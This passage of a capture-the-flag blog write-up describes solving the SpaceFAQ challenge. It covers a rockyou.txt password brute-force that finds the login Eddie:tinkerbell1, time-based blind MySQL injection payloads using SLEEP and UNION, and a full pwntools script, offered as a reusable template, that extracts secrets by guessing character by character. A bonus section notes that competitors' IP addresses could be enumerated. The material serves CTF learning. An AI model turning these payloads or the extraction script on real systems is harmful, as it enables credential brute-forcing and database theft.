+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">print</span>(r)
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> rockyou():
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">with</span> <span style="color:#fff;font-weight:bold">open</span>(<span style="color:#0ff;font-weight:bold">&#34;/usr/share/wordlists/rockyou.txt&#34;</span>,) <span style="color:#fff;font-weight:bold">as</span> f:
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">for</span> i in f:
+</span></span><span style="display:flex;"><span>            i = i.strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">yield</span> i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn = remake_conn()
+</span></span><span style="display:flex;"><span>give_pass = rockyou()
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">while</span> <span style="color:#fff;font-weight:bold">True</span>:
+</span></span><span style="display:flex;"><span>    password = <span style="color:#fff;font-weight:bold">next</span>(give_pass)
+</span></span><span style="display:flex;"><span>    try_login(user, password)
+</span></span></code></pre></div><p>By Wednesday, all challenges besides SpaceFAQ had be solved, resulting in a hint being released. With my motivation resparked, I recalled that my brute-force from day one was cut short. I set out to brute-force the username &ldquo;Eddie&rdquo; again, determined to exhaust all passwords in <em>rockyou.txt</em>.</p>
+<p>To my astonishment, entry 7369 of <em>rockyou.txt</em> suceeded&ndash;just over 1000 lines after where left off two days prior. The credentials to SpaceFAQ were <code>Eddie:tinkerbell1</code>.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQEddieLogin.jpg"/>
+</figure>
+
+<p>Now logged in, I was able to ask the FAQ for a question. When I wrote nothing and only pressed enter, SpaceFAQ printed all FAQs and answers:</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQAllResults.jpg"/>
+</figure>
+
+<p>Three of the FAQs printed provide insight into the next steps of the SpaceFAQ challenge.</p>
+<blockquote>
+<p>Q: where is that flag anyway?<br>
+A: maybe ponder how your previous seaches are tracked, a flag is just a secret with the &ldquo;name&rdquo; flag, where might one keep &ldquo;secrets&rdquo;?<br>
+Q: what database are you running anyway<br>
+A: Well, I feel kind of bad for you, so I&rsquo;ll tell you. It&rsquo;s a mysql database :) enjoy the hint.<br>
+Q: hint? you want a hint<br>
+A: ok fine. here ya go. you&rsquo;re welcome: <a href="https://www.setsolutions.com/journey-of-learning-sql-injection-is-fun/" target="_blank" rel="noreferrer noopener">https://www.setsolutions.com/journey-of-learning-sql-injection-is-fun/</a>
+</p>
+</blockquote>
+<p>The FAQ told me that the underlying database is MySQL and the blog provided me with the notion of <em>Time-based Blind SQL Injection</em>. Given the hints for <a href="/blog/set-solutions-ctf-2021-week1/#space-flag">Space Flag from Week 1</a>
+, the FAQ is probably trying to convey that the flag exists in the table &ldquo;secrets&rdquo; where the column &ldquo;name&rdquo; is equal to &ldquo;flag&rdquo;.</p>
+<p>Starting with MySQL injection basics, I sent <code>'</code>, resulting in SpaceFAQ noting &ldquo;an error occured&rdquo;.</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQOnlyQuote.jpg"/>
+</figure>
+
+<p>Pivoting to <em>union</em> and <em>sleep</em>-based SQL injection, I sent the command <code>' UNION SELECT SLEEP(3),1</code> which caused the server to wait three seconds before sending a reply. Success! the SpaceFAQ search is vulnerable to a sleep-based blind SQL injection. Additionally, it was confirmed that the underlying query selects two values, as I successfully caused the server to sleep when upon selecting two values. <em>note: you&rsquo;ll have to take my word on the response delay as the screenshot does not contaoin output times</em></p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQSleep3.jpg"/>
+</figure>
+
+<p>Since injecting the SLEEP command only works when two columns are selected <code>SLEEP(3),1</code>, and the FAQ mention &ldquo;maybe ponder how your previous seaches are tracked&hellip;&rdquo; it can be assumed that the underlying SQL query follows a similar structure to the following:</p>
+<p><code>&quot;SELECT var1, var2 FROM table1 WHERE column1=usrvar1 AND search='{search}'&quot;</code></p>
+<p>To confirm that the table <em>secrets</em> exists and has a <em>name</em> entry of <em>flag</em>, I sent two queries. Both queries resulted in the server sleeping for three seconds, confirming that the column <em>name</em> exists, and that the entry <em>flag</em> exists in <em>name</em>, respectively.</p>
+<p><code>a' UNION SELECT SLEEP(3),name FROM secrets WHERE 1=1 AND '1'='1</code><br>
+<code>a ' UNION SELECT SLEEP(3),name FROM secrets WHERE name = 'flag' AND '1'='1</code></p>
+<p>It is important to note that the query ends with <code>AND '1'='1</code>, due to the SQL injection being initiated with <code>'</code>. To not cause a syntax error, the final query must have an equal number of quotes.</p>
+<p>During the challenge, I created a sleep-based blind SQL injection python script which uses depth-first search to brute-force values. The following code contains adjustments made after the challenge, allowing the script to serve as an easily-modifiable template for future use.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">from</span> pwn <span style="color:#fff;font-weight:bold">import</span> remote
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST = <span style="color:#0ff;font-weight:bold">&#34;3.14.173.61&#34;</span>
+</span></span><span style="display:flex;"><span>PORT = <span style="color:#ff0;font-weight:bold">1337</span>
+</span></span><span style="display:flex;"><span>USERNAME = <span style="color:#0ff;font-weight:bold">&#34;Eddie&#34;</span>
+</span></span><span style="display:flex;"><span>PASSWORD = <span style="color:#0ff;font-weight:bold">&#34;tinkerbell1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MAX_FINDINGS = <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#007f7f"># number of findings for recursive_loop to locate </span>
+</span></span><span style="display:flex;"><span>VERBOSE = <span style="color:#fff;font-weight:bold">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> make_conn():
+</span></span><span style="display:flex;"><span>    conn = remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>    conn.recvuntil(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;): &#34;</span>)
+</span></span><span style="display:flex;"><span>    conn.send(USERNAME.encode())
+</span></span><span style="display:flex;"><span>    conn.recvuntil(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;Password: &#34;</span>)
+</span></span><span style="display:flex;"><span>    conn.send(PASSWORD.encode())
+</span></span><span style="display:flex;"><span>    conn.recvuntil(<span style="color:#0ff;font-weight:bold">b</span><span style="color:#0ff;font-weight:bold">&#34;): &#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> conn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">class</span> RecursiveSQLInjection():
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># modify sleep time depending on connection stability</span>
+</span></span><span style="display:flex;"><span>    SLEEP_TIME = <span style="color:#ff0;font-weight:bold">.5</span>  
+</span></span><span style="display:flex;"><span>    <span style="color:#007f7f"># &#34;_&#34; near the beginning of CHARS string to increase performance CTF challenges</span>
+</span></span><span style="display:flex;"><span>    CHARS = (string.ascii_lowercase + string.digits + string.punctuation) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">def</span> __init__(self, conn):
+</span></span><span style="display:flex;"><span>        self.verbose = VERBOSE
+</span></span><span style="display:flex;"><span>        self.conn = conn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">def</span> time_based_query(self, query_val):
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># query function should be modified depending on use case</span>
+</span></span><span style="display:flex;"><span>        query = <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;a&#39; UNION SELECT SLEEP(</span><span style="color:#0ff;font-weight:bold">{</span>self.SLEEP_TIME<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">),1 FROM secrets WHERE &#34;</span> \
+</span></span><span style="display:flex;"><span>                <span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;SUBSTR(value,1,</span><span style="color:#0ff;font-weight:bold">{</span><span style="color:#fff;font-weight:bold">len</span>(query_val)<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">) = &#39;</span><span style="color:#0ff;font-weight:bold">{</span>query_val<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#39; AND &#39;1&#39;=&#39;1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> self.verbose: <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[&gt;] Attempting: </span><span style="color:#0ff;font-weight:bold">{</span>query<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>        start = time.time()
+</span></span><span style="display:flex;"><span>        self.conn.send(query.encode())
+</span></span><span style="display:flex;"><span>        self.conn.recvuntil(<span style="color:#0ff;font-weight:bold">&#34;): &#34;</span>.encode())
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> (time.time() - start) &gt;= (self.SLEEP_TIME * <span style="color:#ff0;font-weight:bold">.8</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;[+] VALID: </span><span style="color:#0ff;font-weight:bold">{</span>query<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#fff;font-weight:bold">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">def</span> recursive_loop(self, found: <span style="color:#fff;font-weight:bold">set</span>=<span style="color:#fff;font-weight:bold">set</span>(), cur_string=<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># depth-first search to locate values until MAX_FINDINGS is reached</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># does not confirm intermittent findings with a select statement</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># i.e if both &#34;value&#34; and &#34;value_fake&#34; exist, only &#34;value_fake&#34; will be found</span>
+</span></span><span style="display:flex;"><span>        has_finding = <span style="color:#fff;font-weight:bold">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">for</span> char in self.CHARS:
+</span></span><span style="display:flex;"><span>            test_string = cur_string + char
+</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> has_finding := self.time_based_query(test_string):
+</span></span><span style="display:flex;"><span>                found = found.union(self.recursive_loop(found, test_string))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#007f7f"># break if max findings hit</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (self.MAX_FINDINGS &gt; <span style="color:#ff0;font-weight:bold">0</span>) and (<span style="color:#fff;font-weight:bold">len</span>(found) &gt;= self.MAX_FINDINGS):
+</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">break</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#007f7f"># continue the CHAR loop if cur_flag + test_char was not valid</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> self.verbose: <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;exhausted &#39;</span><span style="color:#0ff;font-weight:bold">{</span>cur_string<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#39; + ...&#34;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># if no findings and cur_string is not empty, cur_string must be a valid item</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">if</span> not has_finding and cur_string != <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>:
+</span></span><span style="display:flex;"><span>            self.verbose: <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;Adding </span><span style="color:#0ff;font-weight:bold">{</span>cur_string<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold"> to found&#34;</span>)
+</span></span><span style="display:flex;"><span>            found.add(cur_string)
+</span></span><span style="display:flex;"><span>        <span style="color:#007f7f"># once CHARS is exhausted, cur_flag must be &#34;&#34; or a flag</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> found
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">def</span> main():
+</span></span><span style="display:flex;"><span>    conn = make_conn()
+</span></span><span style="display:flex;"><span>    solver = RecursiveSQLInjection(conn)
+</span></span><span style="display:flex;"><span>    found = solver.recursive_loop()
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;[+] Findings:&#34;</span>)
+</span></span><span style="display:flex;"><span>    [<span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">f</span><span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">\t</span><span style="color:#0ff;font-weight:bold">{</span>finding<span style="color:#0ff;font-weight:bold">}</span><span style="color:#0ff;font-weight:bold">&#34;</span>) <span style="color:#fff;font-weight:bold">for</span> finding in found]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">if</span> __name__ == <span style="color:#0ff;font-weight:bold">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><p>After various modifications following failed attempts, I ran and the script for a final time and was able to brute-force the flag:</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQFlagClean.jpg"/>
+</figure>
+
+<h2 id="bonus">
+  Bonus
+  <a class="heading-link" href="#bonus">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>For bonus points, I investigated other areas of interest in the database, including the <em>searches</em> table. I discovered that the <em>searches</em> table contained three columns, being the <em>id</em>, <em>remotesource</em>, and <em>search</em> for each respective search. Curious, I enumerated <em>remotesource</em> for the first few searches in the table, and located an IP address corresponding to the location of the challenge creator:</p>
+<figure class="centered"><img src="/images/blog/SetSolutionsWeek4/SpaceFAQRemoteIPCut.jpg"/>
+</figure>
+
+<p>In theory, anyone could have enumerated the IP addresses of other competitors working on the <em>SpaceFAQ</em> challenge. Luckily, the competition pool for the CTF was small, and as far as I am aware, no denial of service foul-play happened.</p>
+<h1 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Week 4 lessons learned: <em>enumerate</em>, <em>enumerate</em>, <em>enumerate</em>. And when you think you&rsquo;re done, <em>enumerate</em> more. SpaceFAQ could have been solved significantly faster if I continued to attempt password brute-forcing. Going forward, I will continue to build &ldquo;template&rdquo; scripts to assist with starting challenges <em>SpaceFAQ</em>.</p>
+<p>Big shoutout to Set Solutions for the incredible CTF, and for providing me with the SpaceFAQ source code once the challenge concluded.</p>
+<p><strong>Quick Navigation</strong><br>
+<a href="/blog/set-solutions-ctf-2021-week1">Week 1</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week2">Week 2</a>
+ \
+<a href="/blog/set-solutions-ctf-2021-week3">Week 3</a>
+</p>
+
+  </article>
+</section>
+
+  
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2024
+     Adin Drabkin 
+    ·
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js" integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
